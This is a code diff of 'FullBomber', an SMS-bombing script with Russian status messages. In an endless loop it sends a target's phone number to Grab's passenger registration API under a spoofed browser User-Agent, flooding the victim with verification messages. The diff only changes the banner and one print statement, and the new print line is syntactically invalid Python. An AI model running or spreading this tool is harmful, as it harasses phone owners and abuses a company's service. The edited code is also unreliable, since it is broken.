@@ -4,13 +4,13 @@ from colorama import Fore, Back, Style
 banner = """
  ____________________________________________________
 |                                                    |
-| [--] Name: FullBomber                                 |
+| [--] Name: FullBomber                              |
 |                                                    |
 | [--] Have Services: 51                             |
 |                                                    |
 | [--] Created by: @DarkSuana                        |
 |                                                    |
-| [--] Version: 1.0.6                                |
+| [--] Version: 1.0.0                                |
 |____________________________________________________|
 """
 
@@ -43,7 +43,7 @@ while True:
 	email = _name+f'{iteration}'+'@gmail.com'
 	try:
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print('[+] Grab отправлено!')
+		print(colored"([+] Grab отправлено)", 'lawngreen')
 	except:
 		print('[-] Не отправлено!')
 
